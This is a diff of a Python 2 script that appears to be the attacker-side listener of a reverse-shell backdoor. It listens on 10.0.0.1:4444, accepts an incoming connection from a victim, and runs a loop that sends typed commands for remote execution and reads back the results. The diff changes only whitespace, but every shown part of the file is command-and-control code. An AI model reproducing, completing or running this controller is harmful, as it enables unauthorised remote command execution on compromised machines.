@@ -1,10 +1,11 @@
 #! /usr/bin/env python
 import socket, json
 
-#TCP Client.
+# TCP Client.
 tcpServer = ""
 ip = "10.0.0.1"
 port = 4444
+
 
 class Listener:
     def __init__(self, ip, port):
@@ -15,7 +16,7 @@ class Listener:
         print("[+] Listening...")
         self.connection, address = listener.accept()
         print("Received a connection from " + str(address))
-    
+
     def reliable_send(self, data):
         json_data = json.dumps(data.decode("utf-8"))
         self.connection.send(json_data)
@@ -31,7 +32,7 @@ class Listener:
     def execute_remotely(self,command):
         self.reliable_send(command)
         return self.reliable_receive()
-    
+
     def run(self):
         while True:
             command = raw_input(">> ")
